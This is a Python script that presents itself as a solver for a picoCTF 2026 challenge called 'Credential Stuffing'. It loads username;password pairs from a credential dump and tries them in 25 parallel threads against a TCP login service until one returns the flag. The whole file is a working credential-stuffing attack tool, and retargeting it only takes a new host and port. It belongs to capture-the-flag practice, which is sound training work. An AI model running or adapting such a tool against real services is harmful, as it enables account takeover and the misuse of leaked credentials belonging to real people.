"""Credential stuffing solver for picoCTF 2026 'Credential Stuffing'.
Reads creds (user;pass), tries each against the bank TCP service, finds the
credential pair that logs in and prints the flag."""
import socket, re, time, concurrent.futures, sys

HOST = "crystal-peak.picoctf.net"
PORT = 49648
CREDS_FILE = "creds-dump.txt"
WORKERS = 25

def load_creds(path):
    out = []
    for line in open(path, errors="replace"):
        line = line.strip()
        if ";" in line:
            u, p = line.split(";", 1)
            out.append((u.strip(), p.strip()))
    return out

def recv_until(s, markers, timeout=6):
    s.settimeout(timeout)
    data = b""
    try:
        while not any(m in data for m in markers):
            ch = s.recv(4096)
            if not ch:
                break
            data += ch
    except socket.timeout:
        pass
    return data

def try_cred(item):
    idx, user, pwd = item
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((HOST, PORT))
        d1 = recv_until(s, [b"Username: "])
        if b"Username: " not in d1:
            s.close()
            return (idx, user, pwd, "NO_BANNER:" + d1.decode(errors="replace")[:80])
        s.sendall((user + "\n").encode())
        d2 = recv_until(s, [b"Password: "])
        if b"Password: " not in d2:
            s.close()
            return (idx, user, pwd, "NO_PASS_PROMPT:" + d2.decode(errors="replace")[:80])
        s.sendall((pwd + "\n").encode())
        d3 = recv_until(s, [b"picoCTF{", b"Invalid", b"Username: ", b"}"], timeout=8)
        full = (d2 + d3).decode("utf-8", errors="replace")
        s.close()
        return (idx, user, pwd, full)
    except Exception as e:
        return (idx, user, pwd, "ERROR:" + repr(e)[:80])

creds = load_creds(CREDS_FILE)
print(f"[*] {len(creds)} creds, target {HOST}:{PORT}, workers={WORKERS}")

flag = None
hits = []
start = time.time()
with concurrent.futures.ThreadPoolExecutor(max_workers=WORKERS) as ex:
    indexed = [(i, u, p) for i, (u, p) in enumerate(creds)]
    futures = {ex.submit(try_cred, it): it for it in indexed}
    done = 0
    for fut in concurrent.futures.as_completed(futures):
        done += 1
        idx, user, pwd, resp = fut.result()
        if done % 100 == 0:
            print(f"  [{done}/{len(creds)}] {time.time()-start:.0f}s")
        if "picoCTF{" in resp:
            m = re.search(r"picoCTF\{[^}]*\}", resp)
            print(f"\n[+] FLAG at #{idx}: {user}:{pwd}")
            print("    resp:", resp[:400])
            if m:
                flag = m.group()
            for f in futures:
                f.cancel()
            break
        low = resp.lower()
        if "invalid" not in low and "error" not in low and not resp.startswith(("NO_", "ERROR")):
            if any(k in low for k in ["welcome", "balance", "success", "granted", "authenticated", "account", "flag"]):
                print(f"  [?] #{idx} {user}:{pwd} -> {resp[:200]}")
                hits.append((idx, user, pwd, resp))

print("\n=== DONE ===")
if flag:
    print("FLAG:", flag)
else:
    print("No flag. interesting hits:", len(hits))
    for h in hits[:20]:
        print(h)
